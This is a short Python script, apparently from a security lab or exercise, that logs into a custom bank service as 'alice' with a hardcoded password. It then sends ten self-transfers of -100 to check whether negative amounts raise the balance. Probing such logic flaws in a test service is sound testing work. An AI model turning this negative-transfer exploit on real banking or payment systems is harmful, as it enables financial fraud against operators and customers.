# attack_self_transfer.py
from bank_client import BankClient

c = BankClient()
print("alice login:", c.cmd("LOGIN alice qwerty"))
print("Balance before:", c.cmd("BALANCE"))

for _ in range(10):
    print("  ", c.cmd("TRANSFER 2 -100 self"))

print("Balance after:", c.cmd("BALANCE"))
c.close()
